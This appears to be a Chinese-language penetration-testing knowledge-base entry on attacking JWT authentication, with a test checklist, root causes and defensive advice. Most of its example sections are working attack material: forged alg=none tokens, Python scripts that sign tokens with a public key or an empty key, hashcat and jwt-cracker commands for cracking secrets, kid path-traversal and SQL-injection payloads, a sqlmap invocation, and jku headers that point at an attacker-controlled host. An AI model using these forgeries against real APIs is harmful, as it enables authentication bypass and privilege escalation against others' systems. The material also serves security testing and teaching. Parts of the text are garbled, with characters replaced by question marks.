# JWT Attack and Bypass Techniques

**ID**: `api-jwt-001` | **分类**: api | **风险等级**: critical

JWT (JSON Web Token) 攻击技术利?JWT 实现中的设计缺陷、配置错误和协议层漏洞，通过修改算法、伪造签名、操纵声明等方式绕过身份验证。JWT ?Header.Payload.Signature 三部分组成，其安全性完全依赖于签名密钥的保密性和算法的正确实现。实战中发现大量系统存在算法混淆漏洞、弱密钥、kid 注入等问题，攻击者可在不知道密钥的情况下构造有?token

## 触发场景

- 目标 API 使用 JWT (JSON Web Token) 进行身份认证或授
- Authorization: Bearer <token> 请求头中包含 JWT
- Cookie 中存?JWT 用于会话管理
- URL 参数中传?JWT token
- OAuth/OIDC 流程中使?JWT 作为 id_token ?access_token
- 微服务间使用 JWT 进行服务间认?

## 操作检查清单

1. 提取目标 JWT，使?jwt.io 或命令行工具解码 header ?payload
2. 检?header 中的 alg 字段，确认签名算法类
3. 尝试?alg 改为 "none"，移?signature，观察服务端响应
4. 如果 alg ?RS256，尝试获取公钥，?alg 改为 HS256，用公钥作为 HMAC 密钥重新签名
5. 使用 jwt-cracker、hashcat (mode 16500) ?john-the-ripper 爆破 HS256 secret
6. 检?kid 参数是否存在，尝试路径遍?(../../../etc/passwd) ?SQL 注入
7. 修改 payload 中的敏感声明（role、isAdmin、sub、exp），重新签名测试
8. 检?jku/x5u 参数是否允许外部 URL，尝试控制密钥来
9. 测试过期 token 是否仍然有效，测试修?exp 为未来时
10. 验证 iss ?aud 声明，测?token 跨服务复
11. 检?token 是否绑定 IP/User-Agent，测试重放攻?

## 技术手段

- none 算法攻击：{"alg":"none","typ":"JWT"} ?移除签名部分
- 算法混淆攻击：RS256 转HS256，用公钥作为 HMAC-SHA256 密钥
- 弱密钥爆破：使用字典或规则攻击HS256 secret
- kid 路径遍历：kid = "../../config/jwt-secret"
- kid SQL 注入：kid = "key1' OR 1=1--"
- jku/x5u 控制：指定攻击者控制的 JWK URL
- 声明篡改：修?role、isAdmin、scope 等权限声
- 过期时间操纵：设?exp 为极远未来时间或移除 exp
- token 重放：使用已撤销或过期的 token 访问 API
- 跨服务复用：利用相同密钥在不同服务间重放 token

## 症状

- 修改 JWT header 中的 alg ?"none" 后服务端接受无签?token
- ?RS256 算法改为 HS256 并用公钥作为 HMAC 密钥后签名通过验证
- 使用 jwt-cracker 等工具成功爆破出?secret
- 修改 kid 参数指向空文件或已知密钥路径后签名验证通过
- 移除 JWT signature 部分后服务端仍然接受 token
- 修改 payload ?role/privileges/isAdmin 等声明后权限提升
- 使用过期 token 访问 API 仍然返回 200 成功响应

## 根因分析

- JWT 库默认支?"none" 算法且服务端未显式禁
- RS256/HS256 算法混淆：服务端使用公钥验证签名时，若攻击者将 alg 改为 HS256，服务端会用公钥作为 HMAC 密钥验证签名
- JWT secret 使用弱密码（短长度、常见字典词），可被暴力破解
- kid (Key ID) 参数未经严格校验，存在路径遍历、SQL 注入、命令注入风
- 服务端未验证 token 过期时间 (exp) 或在验证失败时回退到不安全的默认行
- jku/x5u 参数允许指定外部密钥 URL，攻击者可控制密钥来源
- 服务端使用对称签?(HS256) 但密钥硬编码在客户端代码或公开配置
- 未验?issuer (iss) ?audience (aud) 声明，导?token 可跨服务复用

## 示例

### none 算法攻击

?JWT header 中的 alg 设置?"none"，移除签名部分，服务端可能接受无签名 token

```
原始 JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

修改 Header ?
{"alg":"none","typ":"JWT"} ?Base64Url ?eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

保留 Payload（Base64Url 不变?
eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9

移除签名部分（空字符串）:
构造最?Token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.

原理: JWT 规范支持 "none" 算法用于调试，部分服务端库默认接?alg=none 且不对签名进行验?适用: 适用于使用旧?JWT 库（PyJWT < 1.5, jsonwebtoken < 9）或未显式禁?none 算法的系统
```

### RS256 ?HS256 算法混淆攻击

将非对称签名算法 RS256 改为对称算法 HS256，用 RS256 公钥作为 HMAC 密钥重新签名

```
步骤 1: 获取目标服务器的 RSA 公钥（通常?/.well-known/jwks.json 或证书中提取?
步骤 2: 修改 JWT Header:
{"alg":"HS256","typ":"JWT"}

步骤 3: 修改 Payload（例如提权）:
{"sub":"admin","role":"superadmin","iat":1718668800,"exp":1718755200}

步骤 4: ?RSA 公钥（PEM 格式的原始字节）作为 HMAC-SHA256 密钥签名:
python3 -c "
import jwt, base64
with open('public_key.pem','rb') as f: pub = f.read()
token = jwt.encode({'sub':'admin','role':'superadmin'}, pub, algorithm='HS256')
print(token)
"

原理: RS256 使用私钥签名/公钥验证，HS256 使用同一密钥签名和验?     当服务端?alg ?RS256 改为 HS256 时，部分库会用验?RS256 的公钥作?HS256 的对称密?     攻击者拥有公钥即可用 HS256 签名，服务端用公钥验证时签名匹配
适用: 适用?jwt-cpp、PyJWT < 2.0、jsonwebtoken 旧版本等未区分对?非对称验证路径的库
```

### HS256 弱密钥暴力破

使用字典攻击或规则攻击爆?JWT HMAC 签名密钥

```
目标 JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

方法 1 - jwt-cracker (Node.js):
npx jwt-cracker "eyJhbGciOiJIUzI1NiIs..." -d rockyou.txt -l 100

方法 2 - Hashcat (mode 16500):
hashcat -m 16500 -a 0 jwt_hash.txt rockyou.txt

方法 3 - John the Ripper:
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt_hash.txt

方法 4 - Python 自定义脚?
import jwt
token = 'eyJhbGciOiJIUzI1NiIs...'
with open('wordlist.txt') as f:
    for line in f:
        try:
            secret = line.strip()
            jwt.decode(token, secret, algorithms=['HS256'])
            print(f'Found: {secret}')
            break
        except jwt.InvalidTokenError:
            pass

原理: HS256 使用对称密钥，只要拿到密钥即可任意伪?token
     弱密钥（短长度、常见字典词）可在数秒到数分钟内被爆?     推荐密钥长度至少 256 ?(32 字节)，使?cryptographically secure random
```

### kid 参数路径遍历注入

利用 kid (Key ID) header 参数的路径遍历漏洞，指向已知密钥文件或空文件

```
原始 JWT Header:
{"alg":"HS256","typ":"JWT","kid":"key-2024-01"}

攻击 1 - 路径遍历到已知密钥文?
{"alg":"HS256","typ":"JWT","kid":"../../../etc/app/jwt-secret"}

攻击 2 - 指向空文件（空签名）:
{"alg":"HS256","typ":"JWT","kid":"/dev/null"}
?服务端读?/dev/null 内容为空，用空字符串作为 HMAC 密钥
?用空密钥重新签名 token

攻击 3 - 路径遍历到硬编码密钥:
{"alg":"HS256","typ":"JWT","kid":"../../config/application.yml"}
?如果服务端解?YAML 并提?secret 字段

构?Payload 并用空密钥签?
python3 -c "
import jwt
header = {'alg':'HS256','typ':'JWT','kid':'/dev/null'}
payload = {'sub':'admin','role':'superadmin'}
token = jwt.encode(payload, '', algorithm='HS256', headers=header)
print(token)
"

原理: kid 参数用于标识签名密钥，服务端可能将其直接拼接为文件路?     未做路径规范化时，攻击者可读取任意文件作为密钥
适用: 适用于将 kid 直接用于文件查找且未做路径校验的 JWT 实现
```

### kid 参数 SQL 注入

kid 参数在服务端可能用于数据库查询，存在 SQL 注入风险

```
原始 JWT Header:
{"alg":"HS256","typ":"JWT","kid":"key-2024-01"}

SQL 注入 Payload:
{"alg":"HS256","typ":"JWT","kid":"admin'--"}'
? {"alg":"HS256","typ":"JWT","kid":"' UNION SELECT secret FROM jwt_keys WHERE '1'='1"}

盲注 Payload:
{"alg":"HS256","typ":"JWT","kid":"' AND (SELECT CASE WHEN (1=1) THEN secret ELSE 'x' END FROM jwt_keys LIMIT 1) LIKE 'a%"}

自动化注?(sqlmap):
sqlmap -u "https://target.com/api" \
  --header "Authorization: Bearer eyJ..." \
  --tamper=jwt \
  --level 5 --risk 3

原理: 服务端可能执行类?SELECT secret FROM jwt_keys WHERE kid = ? 的查?     如果 kid 未经参数化查询，可直接注?SQL
适用: 适用?kid 直接拼接?SQL 查询的实现
```

### JWT 声明（Claim）操纵提

修改 JWT payload 中的权限相关声明实现越权访问

```
原始 Payload:
{"sub":"user123","role":"user","permissions":["read"],"iat":1718668800,"exp":1718755200}

篡改后的 Payload:
{"sub":"admin001","role":"admin","permissions":["read","write","delete","manage_users"],"iat":1718668800,"exp":1718755200}

如果成功获取 secret（通过爆破或其他方式），重新签?
python3 -c "
import jwt
payload = {
    'sub': 'admin001',
    'role': 'admin',
    'permissions': ['read','write','delete','manage_users'],
    'iat': 1718668800,
    'exp': 1718755200
}
token = jwt.encode(payload, 'DISCOVERED_SECRET', algorithm='HS256')
print(token)
"

常见可篡改声?
  - role / roles / userRole ?角色提权
  - isAdmin / is_admin / admin ?布尔权限绕过
  - scope / scopes ?OAuth scope 扩展
  - permissions / claims ?细粒度权?  - sub / user_id / uid ?身份冒用
  - groups / team / department ?组级别访?  - exp ?延长 token 有效?
原理: JWT payload ?Base64 编码，任何人都可解码和修?     如果服务端仅验证签名而未对关键声明做服务端校验，篡改生效
适用: 适用于获取密钥后的权限提升场景，或对签名验证不严格的系统
```

### jku/x5u 头部注入控制密钥来源

利用 jku (JWK Set URL) ?x5u (X.509 URL) 头部参数，指定攻击者控制的密钥 URL

```
原始 JWT Header:
{"alg":"RS256","typ":"JWT","kid":"key-001"}

注入 jku 参数:
{"alg":"RS256","typ":"JWT","kid":"attacker-key","jku":"https://attacker.com/keys.json"}

攻击者服务器 https://attacker.com/keys.json 返回:
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "alg": "RS256",
    "n": "<攻击者生成的 RSA 模数 base64>",
    "e": "AQAB",
    "d": "<攻击者私钥对应的部分，如果服务端需?"
  }]
}

攻击者用对应私钥签名 JWT，服务端从攻击?URL 获取公钥并验证通过

x5u 注入同理:
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

原理: jku/x5u 允许 JWT 动态指定密钥来源，如果服务端未校验 URL 域名
     攻击者可返回自己生成的密钥对，用私钥签名后服务端用该公钥验证通过
适用: 适用于支?jku/x5u 动态密钥加载且未限?URL 白名单的系统
```

### 过期 Token 重用?exp 篡改

利用 token 过期验证不严或修?exp 声明为未来时

```
场景 1 - 服务端未验证 exp:
获取已过?token（如从浏览器历史、代理日志、GitHub 泄露中获取）
直接使用过期 token 访问 API，观察是否返?200

场景 2 - 修改 exp 为未来时?
原始 Payload:
{"sub":"user123","role":"user","exp":1609459200}  // 2021-01-01

篡改?
{"sub":"user123","role":"user","exp":1893456000}  // 2030-01-01

场景 3 - 移除 exp 声明:
{"sub":"user123","role":"user"}  // 完全移除 exp

场景 4 - Grace Period 利用:
部分系统?token 刷新 grace period（如 keycloak 默认 30s-5min??grace period 内使用过?token 可能仍然有效

验证方法:
1. 获取 token，等待其过期后尝试请?2. 修改 exp 为未来时间，重新签名后请?3. 移除 exp 声明，重新签名后请求
4. 检查服务端是否返回 401（应返回）vs 200（存在漏洞）

原理: 部分 JWT 库或自定义验证逻辑忽略 exp 字段
     或使用不安全的默认行为（如验证失败时返回默认用户）
```

## 成功标志

- 服务端接受伪造或篡改?JWT 并返?200 OK
- 能够以更高权限用户身份访问受保护 API
- 能够访问其他用户的资源（水平越权
- 能够调用管理员功能（垂直越权
- token 爆破后成功构造有效签
- 修改后的声明在服务端响应中生效（如返?admin 数据?

## 防御建议

- 显式禁用 "none" 算法，在 JWT 库配置中只允许使用的算法白名
- RS256 ?HS256 使用不同的密钥管理路径，避免算法混淆
- HS256 密钥至少 256 ?(32 字节)，使?cryptographically secure random 生成
- kid 参数使用白名单校验，禁止路径遍历字符 (../ ?，不?SQL 查询
- jku/x5u 参数限制可信域名白名单，强制 TLS 验证
- 严格验证 exp、nbf、iat 声明，不允许过期或未来时?token
- 验证 iss (issuer) ?aud (audience) 声明，防?token 跨服务复
- JWT payload 中不存储敏感数据（密码、身份证号、密钥）
- 实施 token 撤销机制（黑名单或短过期时间 + refresh token
- 绑定 token 到客户端指纹（IP、User-Agent 哈希），防止 token 窃取重放
- 使用短期 access_token (5-15min) + 长期 refresh_token 模式
- 服务端对关键声明（role、isAdmin）进行二次校验，不盲目信?JWT 声明
